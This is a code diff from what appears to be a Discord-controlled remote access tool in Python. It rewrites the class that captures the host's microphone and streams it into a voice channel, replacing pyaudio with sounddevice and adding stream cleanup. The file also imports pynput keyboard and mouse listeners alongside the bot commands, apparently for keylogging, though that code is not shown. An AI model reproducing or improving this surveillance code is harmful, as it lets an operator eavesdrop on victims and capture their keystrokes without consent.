@@ -33,7 +33,7 @@ import datetime
 from datetime import datetime
 import atexit
 import pyttsx3
-import pyaudio
+import sounddevice as sd
 import base64
 from pynput.keyboard import Key, Listener
 from pynput import keyboard, mouse
@@ -896,14 +896,26 @@ def download_libopus():
 opuslib_path = download_libopus()
 discord.opus.load_opus(opuslib_path)
 
-# PyAudioPCM class for streaming audio from the microphone
+# SoundDevice PCM class for streaming audio from the microphone
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=None) -> None:
-        p = pyaudio.PyAudio()
         self.chunks = chunk
-        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+        self.stream = sd.RawInputStream(
+            samplerate=rate,
+            channels=channels,
+            dtype='int16',
+            blocksize=chunk,
+            device=input_device,
+        )
+        self.stream.start()
+
     def read(self) -> bytes:
-        return self.input_stream.read(self.chunks)
+        data, _ = self.stream.read(self.chunks)
+        return bytes(data)
+
+    def cleanup(self) -> None:
+        self.stream.stop()
+        self.stream.close()
 
 # Bot command to join voice channel and stream microphone audio
 @bot.command()
@@ -940,6 +952,10 @@ async def mic_stream_stop(ctx):
     if ctx.voice_client is None:
         await ctx.send(f"`[{current_time()}] Bot ist in keinem Voice-Channel.`", delete_after=10)
         return
+
+    # Cleanup stream
+    if isinstance(ctx.voice_client.source, PyAudioPCM):
+        ctx.voice_client.source.cleanup()
 
     await ctx.voice_client.disconnect()
     await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)
